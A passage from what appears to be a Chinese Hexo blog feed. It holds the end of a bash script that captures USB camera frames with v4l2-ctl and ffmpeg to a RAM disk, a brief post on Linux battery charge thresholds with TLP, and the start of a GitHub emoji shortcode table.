class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;SELECT_CACHE_LOC&#125;</span> -eq 0 ] <span class="hljs-comment">#选择内存盘</span><br><span class="hljs-keyword">then</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;creating RAM disk&quot;</span><br><span class="hljs-keyword">if</span> [ ! -d /dev/shm/<span class="hljs-variable">$&#123;RAM_DIR_NAME&#125;</span> ]<br><span class="hljs-keyword">then</span><br>mkdir /dev/shm/<span class="hljs-variable">$&#123;RAM_DIR_NAME&#125;</span> <span class="hljs-comment">#创建内存盘，需要确认df -h显示/dev/shm挂载方式为tmpfs</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> [ ! -d ./<span class="hljs-variable">$&#123;RAM_DIR_NAME&#125;</span>_link ]<br><span class="hljs-keyword">then</span><br>ln -s /dev/shm/<span class="hljs-variable">$&#123;RAM_DIR_NAME&#125;</span> ./<span class="hljs-variable">$&#123;RAM_DIR_NAME&#125;</span>_link <span class="hljs-comment">#在当前目录下创建软链接方便使用</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">else</span> <span class="hljs-comment">#选择ROM_CAPTURE_PATH指定地址</span><br><span class="hljs-keyword">if</span> [ ! -d ./<span class="hljs-variable">$&#123;ROM_CAPTURE_PATH&#125;</span> ]<br><span class="hljs-keyword">then</span><br>mkdir <span class="hljs-variable">$&#123;ROM_CAPTURE_PATH&#125;</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br>v4l2-ctl --list-devices <span class="hljs-comment">#显示当前连接的摄像头设备</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;IS_HARDCODE&#125;</span> -eq 1 ]<br><span class="hljs-keyword">then</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;using the hardcode now&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Choose:/dev/video<span class="hljs-variable">$&#123;DEVICE_LOC&#125;</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;resolution:<span class="hljs-variable">$&#123;CAP_WIDTH&#125;</span>x<span class="hljs-variable">$&#123;CAP_HEIGHT&#125;</span> in <span class="hljs-variable">$&#123;CAP_PIXFMT&#125;</span>&quot;</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span> ]<br><span class="hljs-keyword">then</span><br>DEVICE_LOC=<span class="hljs-variable">$2</span><br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;选择设备(格式:若选择/dev/video0，则输入0。没有检查输入所以自己注意):&quot;</span><br><span class="hljs-built_in">read</span> DEVICE_LOC<br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Choose:/dev/video<span class="hljs-variable">$&#123;DEVICE_LOC&#125;</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;在如下信息中选择摄像头参数&quot;</span><br>v4l2-ctl -d<span class="hljs-variable">$&#123;DEVICE_LOC&#125;</span> --list-formats-ext <span class="hljs-comment">#注意⚠️返回值写着摄像头支持的所有输出模式，如YUYV</span><br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span> ]<br><span class="hljs-keyword">then</span><br>CAP_WIDTH=<span class="hljs-variable">$3</span><br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;请输入捕捉宽度&quot;</span><br><span class="hljs-built_in">read</span> CAP_WIDTH<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$4</span>&quot;</span> ]<br><span class="hljs-keyword">then</span><br>CAP_HEIGHT=<span class="hljs-variable">$4</span><br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;请输入捕捉高度&quot;</span><br><span class="hljs-built_in">read</span> CAP_HEIGHT<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$5</span>&quot;</span> ]<br><span class="hljs-keyword">then</span><br>CAP_PIXFMT=<span class="hljs-variable">$5</span><br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;请输入像素格式&quot;</span><br><span class="hljs-built_in">read</span> CAP_PIXFMT<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;CAP_PIXFMT&#125;</span> = <span class="hljs-string">&quot;YUYV&quot;</span> ] <span class="hljs-comment">#捕获格式不为YUYV时不进行转码</span><br><span class="hljs-keyword">then</span><br>CAP_SUFFIX=raw <span class="hljs-comment">#为之前出现的bug作修补即前面volatile的警告</span><br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;SELECT_CACHE_LOC&#125;</span> -eq 0 ] <span class="hljs-comment">#选择内存盘</span><br><span class="hljs-keyword">then</span><br>v4l2-ctl --verbose \<br>-d<span class="hljs-variable">$&#123;DEVICE_LOC&#125;</span> \<br>--set-fmt-video=width=<span class="hljs-variable">$&#123;CAP_WIDTH&#125;</span>,height=<span class="hljs-variable">$&#123;CAP_HEIGHT&#125;</span>,pixelformat=<span class="hljs-variable">$&#123;CAP_PIXFMT&#125;</span> \<br>--stream-mmap \<br>--stream-count=1 \<br>--stream-to=./<span class="hljs-variable">$&#123;RAM_DIR_NAME&#125;</span>_link/output.<span class="hljs-variable">$&#123;CAP_SUFFIX&#125;</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;CAP_PIXFMT&#125;</span> = <span class="hljs-string">&quot;YUYV&quot;</span> ] <span class="hljs-comment">#捕获格式不为YUYV时不进行转码</span><br><span class="hljs-keyword">then</span><br>ffmpeg -y -s:v <span class="hljs-variable">$&#123;CAP_WIDTH&#125;</span>x<span class="hljs-variable">$&#123;CAP_HEIGHT&#125;</span> -pix_fmt <span class="hljs-variable">$&#123;PIX_FMT_FFMPEG&#125;</span> -i ./<span class="hljs-variable">$&#123;RAM_DIR_NAME&#125;</span>_link/output.raw ./<span class="hljs-variable">$&#123;RAM_DIR_NAME&#125;</span>_link/output.jpeg<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">else</span> <span class="hljs-comment">#选择ROM_CAPTURE_PATH指定地址</span><br>v4l2-ctl --verbose \<br>-d<span class="hljs-variable">$&#123;DEVICE_LOC&#125;</span> \<br>--set-fmt-video=width=<span class="hljs-variable">$&#123;CAP_WIDTH&#125;</span>,height=<span class="hljs-variable">$&#123;CAP_HEIGHT&#125;</span>,pixelformat=<span class="hljs-variable">$&#123;CAP_PIXFMT&#125;</span> \<br>--stream-mmap \<br>--stream-count=1 \<br>--stream-to=<span class="hljs-variable">$&#123;ROM_CAPTURE_PATH&#125;</span>/output.<span class="hljs-variable">$&#123;CAP_SUFFIX&#125;</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;CAP_PIXFMT&#125;</span> = <span class="hljs-string">&quot;YUYV&quot;</span> ] <span class="hljs-comment">#捕获格式不为YUYV时不进行转码</span><br><span class="hljs-keyword">then</span><br>ffmpeg -y -s:v <span class="hljs-variable">$&#123;CAP_WIDTH&#125;</span>x<span class="hljs-variable">$&#123;CAP_HEIGHT&#125;</span> -pix_fmt <span class="hljs-variable">$&#123;PIX_FMT_FFMPEG&#125;</span> -i <span class="hljs-variable">$&#123;ROM_CAPTURE_PATH&#125;</span>/output.raw <span class="hljs-variable">$&#123;ROM_CAPTURE_PATH&#125;</span>/output.jpeg<br><span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br>end=`date +%s.%N`<br><span class="hljs-function"><span class="hljs-title">getTiming</span></span>()&#123; <span class="hljs-comment">#https://blog.csdn.net/bowenlaw/article/details/103789158</span><br>    start=<span class="hljs-variable">$1</span><br>    end=<span class="hljs-variable">$2</span>  <br>    start_s=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$start</span> | cut -d <span class="hljs-string">&#x27;.&#x27;</span> -f 1)<br>    start_ns=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$start</span> | cut -d <span class="hljs-string">&#x27;.&#x27;</span> -f 2)<br>    end_s=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$end</span> | cut -d <span class="hljs-string">&#x27;.&#x27;</span> -f 1)<br>    end_ns=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$end</span> | cut -d <span class="hljs-string">&#x27;.&#x27;</span> -f 2)<br>    time=`expr <span class="hljs-variable">$end_s</span> \* 1000 - <span class="hljs-variable">$start_s</span> \* 1000 + <span class="hljs-variable">$end_ns</span> / 1000000 - <span class="hljs-variable">$start_ns</span> / 1000000`<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$time</span> ms&quot;</span><br>&#125; <br>result=$(getTiming <span class="hljs-variable">$start</span> <span class="hljs-variable">$end</span>) <br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$result</span> <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">info: v4l2-input: /dev/video1 seems to not support video capture<br>info: v4l2-input: Found device <span class="hljs-string">&#x27;USB Camera: USB Camera&#x27;</span> at /dev/video0<br>info: v4l2-input: Start capture from /dev/video2<br>error: v4l2-input: Unable to open device<br>error: v4l2-input: Initialization failed, errno: 没有那个文件或目录<br>info: v4l2-input: Start capture from /dev/video0<br>info: v4l2-input: Input: 0<br>info: v4l2-input: Found input <span class="hljs-string">&#x27;Camera 1&#x27;</span> (Index 0)<br>info: v4l2-controls: setting default <span class="hljs-keyword">for</span> Power Line Frequency to 2<br>info: v4l2-input: Pixelformat: YUYV 4:2:2 (available)<br>info: v4l2-input: Pixelformat: RGB3 (Emulated) (unavailable)<br>info: v4l2-input: Pixelformat: BGR3 (Emulated) (available)<br>info: v4l2-input: Pixelformat: YU12 (Emulated) (available)<br>info: v4l2-input: Pixelformat: YV12 (Emulated) (available)<br>info: v4l2-input: Stepwise and Continuous framesizes are currently hardcoded<br>info: v4l2-input: Resolution: 640x480<br>info: v4l2-input: Pixelformat: YUYV<br>info: v4l2-input: Linesize: 1280 Bytes<br>info: v4l2-input: Framerate: 30.00 fps<br>info: v4l2-input: /dev/video0: select timeout <span class="hljs-built_in">set</span> to 166666 (5x frame periods)<br></code></pre></td></tr></table></figure><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://github.com/obsproject/obs-studio/blob/c5015d0e6cb180d138e1a9e2258afd903254b9ea/plugins/linux-v4l2/v4l2-input.c">https://github.com/obsproject/obs-studio/blob/c5015d0e6cb180d138e1a9e2258afd903254b9ea/plugins/linux-v4l2/v4l2-input.c</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://stackoverflow.com/questions/70961566/how-to-convert-raw-yuv-image-to-jpg">https://stackoverflow.com/questions/70961566/how-to-convert-raw-yuv-image-to-jpg</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://unix.stackexchange.com/questions/26364/how-can-i-create-a-tmpfs-as-a-regular-non-root-user">https://unix.stackexchange.com/questions/26364/how-can-i-create-a-tmpfs-as-a-regular-non-root-user</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://superuser.com/questions/389500/how-can-i-mount-a-tmpfs-without-root">https://superuser.com/questions/389500/how-can-i-mount-a-tmpfs-without-root</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><figure class="highlight bash"><table><tr><td class="gutter">undefined</td><td class="code">undefined</td></tr></table></figure><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="http://zhaoxuhui.top/blog/2021/09/23/v4l2-introduction-and-usb-camera-bayer-raw-data.html">http://zhaoxuhui.top/blog/2021/09/23/v4l2-introduction-and-usb-camera-bayer-raw-data.html</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>嵌入式</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>嵌入式</tag>
      
      <tag>Linux</tag>
      
      <tag>计算机视觉</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux下充电阈值设置-dkms&amp;TLP</title>
    <link href="/charge-thresholdOfLinux/"/>
    <url>/charge-thresholdOfLinux/</url>
    
    <content type="html"><![CDATA[<h1 id="先放链接"><a href="#先放链接" class="headerlink" title="先放链接"></a>先放链接</h1><blockquote><p><a href="https://blog.csdn.net/dadoneo/article/details/6035661">https://blog.csdn.net/dadoneo/article/details/6035661</a><br><a href="https://cnzhx.net/blog/power-management-and-battery-threshold-in-linux-on-t470s/">https://cnzhx.net/blog/power-management-and-battery-threshold-in-linux-on-t470s/</a></p></blockquote><p>上面⬆️的大概只能在受支持的电脑上用，但这是我一开始了解所用的文章所以同时记录下来</p><blockquote><p>后来找到tlp，这也是up主“飞蚊话”介绍过的软件<br><a href="https://www.bwsl.wang/linux/11.html">https://www.bwsl.wang/linux/11.html</a></p></blockquote><blockquote><p>tlp关于充电阈值方面的QA非常多，可以输入tlp-stat -b检查阈值是否生效，但我这部电脑不支持，就不继续深入了解了<br><a href="https://linrunner.de/tlp/faq/battery.html#how-do-battery-charge-thresholds-work">https://linrunner.de/tlp/faq/battery.html#how-do-battery-charge-thresholds-work</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>技术备忘</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GitHub的md渲染支持的emoji标签</title>
    <link href="/blog/emoji-tag/"/>
    <url>/blog/emoji-tag/</url>
    
    <content type="html"><![CDATA[<h1 id="批注"><a href="#批注" class="headerlink" title="批注"></a>批注</h1><p>该文章来自:<a href="https://gist.github.com/rxaviers/7360908">https://gist.github.com/rxaviers/7360908</a><br>但是我的博客现在还暂时不支持这种渲染。</p><span id="more"></span><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>People</p><table><thead><tr><th>:bowtie: <code>:bowtie:</code></th><th>:smile: <code>:smile:</code></th><th>:laughing: <code>:laughing:</code></th></tr></thead><tbody><tr><td>:blush: <code>:blush:</code></td><td>:smiley: <code>:smiley:</code></td><td>:relaxed: <code>:relaxed:</code></td></tr><tr><td>:smirk: <code>:smirk:</code></td><td>:heart_eyes: <code>:heart_eyes:</code></td><td>:kissing_heart: <code>:kissing_heart:</code></td></tr><tr><td>:kissing_closed_eyes: <code>:kissing_closed_eyes:</code></td><td>:flushed: <code>:flushed:</code></td><td>:relieved: <code>:relieved:</code></td></tr><tr><td>:satisfied: <code>:satisfied:</code></td><td>:grin: <code>:grin:</code></td><td>:wink: <code>:wink:</code></td></tr><tr><td>:stuck_out_tongue_winking_eye: <code>:stuck_out_tongue_winking_eye:</code></td><td>:stuck_out_tongue_closed_eyes: <code>:stuck_out_tongue_closed_eyes:</code></td><td>:grinning: <code>:grinning:</code></td></tr><tr><td>:kissing: <code>:kissing:</code></td><td>:kissing_smiling_eyes: <code>:kissing_smiling_eyes:</code></td><td>:stuck_out_tongue: <code>:stuck_out_tongue:</code></td></tr><tr><td>:sleeping: <code>:sleeping:</code></td><td>:worried: <code>:worried:</code></td><td>:frowning: <code>:frowning:</code></td></tr><tr><td>:anguished: <code>:anguished:</code></td><td>:open_mouth: <code>:open_mouth:</code></td><td>:grimacing: <code>:grimacing:</code></td></tr><tr><td>:confused: <code>:confused:</code></td><td>:hushed: <code>:hushed:</code></td><td>:expressionless: <code>:expressionless:</code></td></tr><tr><td>:unamused: <code>:unamused:</code></td><td>:sweat_smile: <code>:sweat_smile:</code></td><td>:sweat: <code>:sweat:</code></td></tr><tr><td>:disappointed_relieved: <code>:disappointed_relieved:</code></td><td>:weary: <code>:weary:</code></td><td>:pensive: <code>:pensive:</code></td></tr><tr><td>:disappointed: <code>:disappointed:</code></td><td>:confounded: <code>:confounded:</code></td><td>:fearful: <code>:fearful:</code></td></tr><tr><td>:cold_sweat: <code>:cold_sweat:</code></td><td>:persevere: <code>:persevere:</code></td><td>:cry: <code>:cry:</code></td></tr><tr><td>:sob: <code>:sob:</code></td><td>:joy: <code>:joy:</code></td><td>:astonished: <code>:astonished:</code></td></tr><tr><td>:scream: <code>:scream:</code></td><td>:neckbeard: <code>:neckbeard:</code></td><td>:tired_face: <code>:tired_face:</code></td></tr><tr><td>:angry: <code>:angry:</code></td><td>:rage: <code>:rage:</code></td><td>:triumph: <code>:triumph:</code></td></tr><tr><td>:sleepy: <code>:sleepy:</code></td><td>:yum: <code>:yum:</code></td><td>:mask: <code>:mask:</code></td></tr><tr><td>:sunglasses: <code>:sunglasses:</code></td><td>:dizzy_face: <code>:dizzy_face:</code></td><td>:imp: <code>:imp:</code></td></tr><tr><td>:smiling_imp: <code>:smiling_imp:</code></td><td>:neutral_face: <code>:neutral_face:</code></td><td>:no_mouth: <code>:no_mouth:</code></td></tr><tr><td>:innocent: <code>:innocent:</code></td><td>:alien: <code>:alien:</code></td><td>:yellow_heart: <code>:yellow_heart:</code></td></tr><tr><td>:blue_heart: <code>:blue_heart:</code></td><td>:purple_heart: <code>:purple_heart:</code></td><td>:heart: <code>:heart:</code></td></tr><tr><td>:green_heart: <code>:green_heart:</code></td><td>:broken_heart: <code>:broken_heart:</code></td><td>:heartbeat: <code>:heartbeat:</code></td></tr><tr><td>:heartpulse: <code>:heartpulse:</code></td><td>:two_hearts: <code>:two_hearts:</code></td><td>:revolving_hearts: <code>:revolving_hearts:</code></td></tr><tr><td>:cupid: <code>:cupid:</code></td><td>:sparkling_heart: <code>:sparkling_heart:</code></td><td>:sparkles: <code>:sparkles:</code></td></tr><tr><td>:star: <code>:star:</code></td><td>:star2: <code>:star2:</code></td><td>:dizzy: <code>:dizzy:</code></td></tr><tr><td>:boom: <code>:boom:</code></td><td>:collision: <code>:collision:</code></td><td>:anger: <code>:anger:</code></td></tr><tr><td>:exclamation: <code>:exclamation:</code></td><td>:question: <code>:question:</code></td><td>:grey_exclamation: <code>:grey_exclamation:</code></td></tr><tr><td>:grey_question: <code>:grey_question:</code></td><td>:zzz: <code>:zzz:</code></td><td>:dash: <code>:dash:</code></td></tr><tr><td>:sweat_drops: <code>:sweat_drops:</code></td><td>:notes: <code>:notes:</code></td><td>:musical_note: <code>:musical_note:</code></td></tr><tr><td>:fire: <code>:fire:</code></td><td>:hankey: <code>:hankey:</code></td><td>:poop: <code>:poop:</code></td></tr><tr><td>:shit: <code>:shit:</code></td><td>:+1: <code>:+1:</code></td><td>:thumbsup: <code>:thumbsup:</code></td></tr><tr><td>:-1: <code>:-1:</code></td><td>:thumbsdown: <code>:thumbsdown:</code></td><td>:ok_hand: <code>:ok_hand:</code></td></tr><tr><td>:punch: <code>:punch:</code></td><td>:facepunch: <code>:facepunch:</code></td><td>:fist: <code>:fist:</code></td></tr><tr><td>:v: <code>:v:</code></td><td>:wave: <code>:wave:</code></td><td>:hand: <code>:hand:</code></td></tr><tr><td>:raised_hand: <code>:raised_hand:</code></td><td>:open_hands: <code>:open_hands:</code></td><td>:point_up: <code>:point_up:</code></td></tr><tr><td>:point_down: <code>:point_down:</code></td><td>:point_left: <code>:point_left:</code></td><td>:point_right: <code>:point_right:</code></td></tr><tr><td>:raised_hands: <code>:raised_hands:</code></td><td>:pray: <code>:pray:</code></td><td>:point_up_2: <code>:point_up_2:</code></td></tr><tr><td>:clap: <code>:clap:</code></td><td>:muscle: <code>:muscle:</code></td><td>:metal: <code>:metal:</code></td></tr><tr><td>:fu: <code>:fu:</code></td><td>:walking: <code>:walking:</code></td><td>:runner: <code>:runner:</code></td></tr><tr><td>:running: <code>:running:</code></td><td>:couple: <code>:couple:</code></td><td>:family: <code>:family:</code></td></tr><tr><td>:two_men_holding_hands: <code>:two_men_holding_hands:</code></td><td>:two_women_holding_hands: <code>:two_women_holding_hands:</code></td><td>:dancer: <code>:dancer:</code></td></tr><tr><td>:dancers: <code>:dancers:</code></td><td>:ok_woman: <code>:ok_woman:</code></td><td>:no_good: <code>:no_good:</code></td></tr><tr><td>:information_desk_person: <code>:information_desk_person:</code></td><td>:raising_hand: <code>:raising_hand:</code></td><td>:bride_with_veil: <code>:bride_with_veil:</code></td></tr><tr><td>:person_with_pouting_face: <code>:person_with_pouting_face:</code></td><td>:person_frowning: <code>:person_frowning:</code></td><td>:bow: <code>:bow:</code></td></tr><tr><td>:couplekiss: <code>:couplekiss:</code></td><td>:couple_with_heart: <code>:couple_with_heart:</code></td><td>:massage: <code>:massage:</code></td></tr><tr><td>:haircut: <code>:haircut:</code></td><td>:nail_care: <code>:nail_care:</code></td><td>:boy: <code>:boy:</code></td></tr><tr><td>:girl: <code>:girl:</code></td><td>:woman: <code>:woman:</code></td><td>:man: <code>:man:</code></td></tr><tr><td>:baby: <code>:baby:</code></td><td>:older_woman: <code>:older_woman:</code></td><td>:older_man: <code>:older_man:</code></td></tr><tr><td>:person_with_blond_hair: <code>:person_with_blond_hair:</code></td><td>:man_with_gua_pi_mao: <code>:man_with_gua_pi_mao:</code></td><td>:man_with_turban: <code>:man_with_turban:</code></td></tr><tr><td>:construction_worker: <code>:construction_worker:</code></td><td>:cop: <code>:cop:</code></td><td>:angel: <code>:angel:</code></td></tr><tr><td>:princess: <code>:princess:</code></td><td>:smiley_cat: <code>:smiley_cat:</code></td><td>:smile_cat: <code>:smile_cat:</code></td></tr><tr><td>:heart_eyes_cat: <code>:heart_eyes_cat:</code></td><td>:kissing_cat: <code>:kissing_cat:</code></td><td>:smirk_cat: <code>:smirk_cat:</code></td></tr><tr><td>:scream_cat: <code>:scream_cat:</code></td><td>:crying_cat_face: <code>:crying_cat_face:</code></td><td>:joy_cat: <code>:joy_cat:</code></td></tr><tr><td>:pouting_cat: <code>:pouting_cat:</code></td><td>:japanese_ogre: <code>:japanese_ogre:</code></td><td>:japanese_goblin: <code>:japanese_goblin:</code></td></tr><tr><td>:see_no_evil: <code>:see_no_evil:</code></td><td>:hear_no_evil: <code>:hear_no_evil:</code></td><td>:speak_no_evil: <code>:speak_no_evil:</code></td></tr><tr><td>:guardsman: <code>:guardsman:</code></td><td>:skull: <code>:skull:</code></td><td>:feet: <code>:feet:</code></td></tr><tr><td>:lips: <code>:lips:</code></td><td>:kiss: <code>:kiss:</code></td><td>:droplet: <code>:droplet:</code></td></tr><tr><td>:ear: <code>:ear:</code></td><td>:eyes: <code>:eyes:</code></td><td>:nose: <code>:nose:</code></td></tr><tr><td>:tongue: <code>:tongue:</code></td><td>:love_letter: <code>:love_letter:</code></td><td>:bust_in_silhouette: <code>:bust_in_silhouette:</code></td></tr><tr><td>:busts_in_silhouette: <code>:busts_in_silhouette:</code></td><td>:speech_balloon: <code>:speech_balloon:</code></td><td>:thought_balloon: <code>:thought_balloon:</code></td></tr><tr><td>:feelsgood: <code>:feelsgood:</code></td><td>:finnadie: <code>:finnadie:</code></td><td>:goberserk: <code>:goberserk:</code></td></tr><tr><td>:godmode: <code>:godmode:</code></td><td>:hurtrealbad: <code>:hurtrealbad:</code></td><td>:rage1: <code>:rage1:</code></td></tr><tr><td>:rage2: <code>:rage2:</code></td><td>:rage3: <code>:rage3:</code></td><td>:rage4: <code>:rage4:</code></td></tr><tr><td>:suspect: <code>:suspect:</code></td><td>:trollface: <code>:trollface:</code></td><td></td></tr></tbody></table><p>Nature</p><table><thead><tr><th>:sunny: <code>:sunny:</code></th><th>:umbrella: <code>:umbrella:</code></th><th>:cloud: <code>:cloud:</code></th></tr></thead><tbody><tr><td>:snowflake: <code>:snowflake:</code></td><td>:snowman: <code>:snowman:</code></td><td>:zap: <code>:zap:</code></td></tr><tr><td>:cyclone: <code>:cyclone:</code></td><td>:foggy: <code>:foggy:</code></td><td>:ocean: <code>:ocean:</code></td></tr><tr><td>:cat: <code>:cat:</code></td><td>:dog: <code>:dog:</code></td><td>:mouse: <code>:mouse:</code></td></tr><tr><td>:hamster: <code>:hamster:</code></td><td>:rabbit: <code>:rabbit:</code></td><td>:wolf: <code>:wolf:</code></td></tr><tr><td>:frog: <code>:frog:</code></td><td>:tiger: <code>:tiger:</code></td><td>:koala: <code>:koala:</code></td></tr><tr><td>:bear: <code>:bear:</code></td><td>:pig: <code>:pig:</code></td><td>:pig_nose: <code>:pig_nose:</code></td></tr><tr><td>:cow: <code>:cow:</code></td><td>:boar: <code>:boar:</code></td><td>:monkey_face: <code>:monkey_face:</code></td></tr><tr><td>:monkey: <code>:monkey:</code></td><td>:horse: <code>:horse:</code></td><td>:racehorse: <code>:racehorse:</code></td></tr><tr><td>:camel: <code>:camel:</code></td><td>:sheep: <code>:sheep:</code></td><td>:elephant: <code>:elephant:</code></td></tr><tr><td>:panda_face: <code>:panda_face:</code></td><td>:snake: <code>:snake:</code></td><td>:bird: <code>:bird:</code></td></tr><tr><td>:baby_chick: <code>:baby_chick:</code></td><td>:hatched_chick: <code>:hatched_chick:</code></td><td>:hatching_chick: <code>:hatching_chick:</code></td></tr><tr><td>:chicken: <code>:chicken:</code></td><td>:penguin: <code>:penguin:</code></td><td>:turtle: <code>:turtle:</code></td></tr><tr><td>:bug: <code>:bug:</code></td><td>:honeybee: <code>:honeybee:</code></td><td>:ant: <code>:ant:</code></td></tr><tr><td>:beetle: <code>:beetle:</code></td><td>:snail: <code>:snail:</code></td><td>:octopus: <code>:octopus:</code></td></tr><tr><td>:tropical_fish: <code>:tropical_fish:</code></td><td>:fish: <code>:fish:</code></td><td>:whale: <code>:whale:</code></td></tr><tr><td>:whale2: <code>:whale2:</code></td><td>:dolphin: <code>:dolphin:</code></td><td>:cow2: <code>:cow2:</code></td></tr><tr><td>:ram: <code>:ram:</code></td><td>:rat: <code>:rat:</code></td><td>:water_buffalo: <code>:water_buffalo:</code></td></tr><tr><td>:tiger2: <code>:tiger2:</code></td><td>:rabbit2: <code>:rabbit2:</code></td><td>:dragon: <code>:dragon:</code></td></tr><tr><td>:goat: <code>:goat:</code></td><td>:rooster: <code>:rooster:</code></td><td>:dog2: <code>:dog2:</code></td></tr><tr><td>:pig2: <code>:pig2:</code></td><td>:mouse2: <code>:mouse2:</code></td><td>:ox: <code>:ox:</code></td></tr><tr><td>:dragon_face: <code>:dragon_face:</code></td><td>:blowfish: <code>:blowfish:</code></td><td>:crocodile: <code>:crocodile:</code></td></tr><tr><td>:dromedary_camel: <code>:dromedary_camel:</code></td><td>:leopard: <code>:leopard:</code></td><td>:cat2: <code>:cat2:</code></td></tr><tr><td>:poodle: <code>:poodle:</code></td><td>:paw_prints: <code>:paw_prints:</code></td><td>:bouquet: <code>:bouquet:</code></td></tr><tr><td>:cherry_blossom: <code>:cherry_blossom:</code></td><td>:tulip: <code>:tulip:</code></td><td>:four_leaf_clover: <code>:four_leaf_clover:</code></td></tr><tr><td>:rose: <code>:rose:</code></td><td>:sunflower: <code>:sunflower:</code></td><td>:hibiscus: <code>:hibiscus:</code></td></tr><tr><td>:maple_leaf: <code>:maple_leaf:</code></td><td>:leaves: <code>:leaves:</code></td><td>:fallen_leaf: <code>:fallen_leaf:</code></td></tr><tr><td>:herb: <code>:herb:</code></td><td>:mushroom: <code>:mushroom:</code></td><td>:cactus: <code>:cactus:</code></td></tr><tr><td>:palm_tree: <code>:palm_tree:</code></td><td>:evergreen_tree: <code>:evergreen_tree:</code></td><td>:deciduous_tree: <code>:deciduous_tree:</code></td></tr><tr><td>:chestnut: <code>:chestnut:</code></td><td>:seedling: <code>:seedling:</code></td><td>:blossom: <code>:blossom:</code></td></tr><tr><td>:ear_of_rice: <code>:ear_of_rice:</code></td><td>:shell: <code>:shell:</code></td><td>:globe_with_meridians: <code>:globe_with_meridians:</code></td></tr><tr><td>:sun_with_face: <code>:sun_with_face:</code></td><td>:full_moon_with_face: <code>:full_moon_with_face:</code></td><td>:new_moon_with_face: <code>:new_moon_with_face:</code></td></tr><tr><td>:new_moon: <code>:new_moon:</code></td><td>:waxing_crescent_moon: <code>:waxing_crescent_moon:</code></td><td>:first_quarter_moon: <code>:first_quarter_moon:</code></td></tr><tr><td>:waxing_gibbous_moon: <code>:waxing_gibbous_moon:</code></td><td>:full_moon: <code>:full_moon:</code></td><td>:waning_gibbous_moon: <code>:waning_gibbous_moon:</code></td></tr><tr><td>:last_quarter_moon: <code>:last_quarter_moon:</code></td><td>:waning_crescent_moon: <code>:waning_crescent_moon:</code></td><td>:last_quarter_moon_with_face: 